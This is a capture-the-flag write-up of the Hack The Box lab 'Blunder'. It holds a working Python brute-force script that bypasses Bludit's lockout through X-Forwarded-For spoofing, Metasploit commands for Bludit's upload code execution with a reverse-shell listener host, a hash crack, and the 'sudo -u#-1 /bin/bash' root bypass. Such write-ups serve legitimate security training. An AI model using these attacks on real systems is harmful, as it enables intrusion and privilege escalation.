---
layout: single
title: Blunder write-up
excerpt: "Blunder is a linux box rate as easy. We need to obtain credential of Bludit v3.9.2 by bruteforce login in order to get a shell. Then, enumerate Bludit files to get user password to switch user into hugo. From there, we could abuse sudo vulnerability to gain root shell."
date: 2020-07-10
classes: wide
header:
  teaser: /asset/htbwriteup/linux/blunder/intro.png
  teaser_home_page: true
  icon: /assets/hackthebox.webp
categories:
  - hackthebox
permalink: /htb/htbBlunder
tags: [ bruteforce, cewl, sudo ]

---

# HTB - Blunder

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/intro.png)

Blunder is a linux box rate as easy. We need to obtain credential of Bludit v3.9.2 by bruteforce login in order to get a shell. Then, enumerate Bludit files to get user password to switch user into hugo. From there, we could abuse sudo vulnerability to gain root shell.

---
## Recon

- Running nmap scan give us the following information as below. Only port 80 is available.
    
![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/1.png)

- Running Gobuster give us `/admin` directory to further up our recon.

---
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.191:80
    [+] Threads:        30
    [+] Wordlist:       /usr/share/wordlists/dirb/common.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Show length:    true
    [+] Extensions:     html,php
    [+] Expanded:       true
    [+] Timeout:        10s
    ===============================================================
    2020/07/11 09:44:20 Starting gobuster
    ===============================================================
    http://10.10.10.191:80/.htpasswd (Status: 403) [Size: 277]
    http://10.10.10.191:80/.htpasswd.html (Status: 403) [Size: 277]
    http://10.10.10.191:80/.htpasswd.php (Status: 403) [Size: 277]
    http://10.10.10.191:80/.hta (Status: 403) [Size: 277]
    http://10.10.10.191:80/.hta.html (Status: 403) [Size: 277]
    http://10.10.10.191:80/.hta.php (Status: 403) [Size: 277]
    http://10.10.10.191:80/.htaccess (Status: 403) [Size: 277]
    http://10.10.10.191:80/.htaccess.html (Status: 403) [Size: 277]
    http://10.10.10.191:80/.htaccess.php (Status: 403) [Size: 277]
    http://10.10.10.191:80/0 (Status: 200) [Size: 7561]
    http://10.10.10.191:80/about (Status: 200) [Size: 3280]
    http://10.10.10.191:80/admin (Status: 301) [Size: 0]
    http://10.10.10.191:80/cgi-bin/ (Status: 301) [Size: 0]
    http://10.10.10.191:80/install.php (Status: 200) [Size: 30]
    http://10.10.10.191:80/LICENSE (Status: 200) [Size: 1083]
    http://10.10.10.191:80/robots.txt (Status: 200) [Size: 22]
    http://10.10.10.191:80/server-status (Status: 403) [Size: 277]
    ===============================================================
    2020/07/11 09:47:28 Finished

---
- Then, we landed to a login page name Bludit. Viewing the source code point us to version number. It's Bludit v3.9.2, then we found a [POC](https://github.com/bludit/bludit/issues/1081) to Bludit v3.9.2 Code Execution Vulnerability in "Upload function". But, weed to authenticate first...

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/3.png)

- After that, we fire-up `wfuzz` and found `todo.txt` as below.

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/4.png)
- The next hint is `Inform fergus that the new blog needs images - PENDING` as well as stated in the POC above which requires credential. It's seems like `fergus` is the admin of Bludit.

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/5.png)
- Googling and we have [Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/). Read and try to understand what happened from the blog as there is a function named `getUserIp` which attempts to determine the _true_ IP address of the end user by trusting the `X-Forwarded-For` and `Client-IP` HTTP headers.
- However, trusting these headers allows an attacker to easily spoof the source address.
- Let's try the PoC to our target. First, we need to modify the script to suit our target. We need to get the username and wordlist as well as url and other parameters.

- Below is my modified version to fetch wordlist via cewl from the web base.
- Modify the `host, login_url, username` and fetch `password` from wordlist .

--- 
```py
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'

# modified version to open wordlist.txt from cewl
path = './wordlist.txt'
with open('wordlist.txt', 'r') as listing:
    wordlist = listing.read().split('\n')


for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

---

- We need a wordlist to attack the bludit login page. Create with `cewl`.

---

```bash
    $ cewl -d 4 -m 8 -w wordlist.txt http://10.10.10.191/ 
    CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

    $ cat wordlist.txt 
    interesting
    Creation
    Javascript
    description
    Bootstrap
    bootstrap
    Networks
    November
    National
    Copyright
    byEgotisticalSW
    American
    published
    received
    literature
    smartphones
    September
    supernatural
    suspense
    miniseries
    television
    including
    approximately
    collections
    Foundation
    Distinguished
    Contribution
    probably
    fictional
    character
    RolandDeschain
    contribution
    Achievement
    Endowment
    contributions
    described
    operated
    streaming
    resolution
    numerous
    provided
    sufficiently
    Internet
    connection
    accessible
    computers
    televisions
    Chromecast
    integrated
    streamer
    compatible
    controllers
    proprietary
    controller
    manufactured
    available
    alongside
    requires
    purchase
    subscription
    resolutions
    universal
    pronounced
    interface
    computer
    communicate
    peripheral
    connected
    anything
    keyboards
    information
    batteries
    commercial
    Universal
    industry
    standard
    Microsoft
    companies
    Pagination
    HackTheBox
    typically
    Remember
```

---

## Exploit

- Run the python script and we get the credential!!

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/6.png)

- To get into shell, there are 2 ways:
1. Manual way via [Bludit v3.9.2 Code Execution Vulnerability in "Upload function"](https://github.com/bludit/bludit/issues/1081) using Burp.
2. Automate with msf module `exploit/linux/http/bludit_upload_images_exec` :satisfied:

- Ahhh, ez way :sweat_smile:

>     msf5 > use exploit/linux/http/bludit_upload_images_exec
>     msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
>     BLUDITPASS => RolandDeschain
>     msf5 exploit(linux/http/bludit_upload_images_exec) > set BLuDITUSER fergus
>     BLuDITUSER => fergus
>     msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
>     RHOSTS => 10.10.10.191
>     msf5 exploit(linux/http/bludit_upload_images_exec) > set targeturi /admin
>     targeturi => /
>     msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST 10.10.14.161
>     msf5 exploit(linux/http/bludit_upload_images_exec) > exploit
---
![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/8.png)

- We are `www-data` shell. Enumerate internal system into `/var/www/bludit-3.10.0a/bl-content/databases/users.php` and we have password hashes of `Hugo`.

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/9.png)

- We could identify the hash using a tool name `hash-identifier` in Kali. It's `SHA-1` possible hash.

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/10.png)

- Then, decrypt the hash online [here](https://md5decrypt.net/en/Sha1/) and we get the password.

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/11.png)

- Let's try to change to Hugo with the password. We are in Hugo shell and get user flag...

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/12.png)

---

## PrivEsc

- As usual, with `sudo -l` and we have `(ALL, !root) /bin/bash` .

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/13.png)

- Google-Fu and we find this [exploit](https://www.exploit-db.com/exploits/47502)  for  `sudo 1.8.27 - Security Bypass`. 
- So user `hugo` can't run `/bin/bash as root (!root)`.

```bash
# User privilege specification
root    ALL=(ALL:ALL) ALL
hugo ALL=(ALL,!root) /bin/bash

With ALL specified, user hugo can run the binary /bin/bash as any user
EXPLOIT: 

sudo -u#-1 /bin/bash

```

![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/14.png)

Thanks...





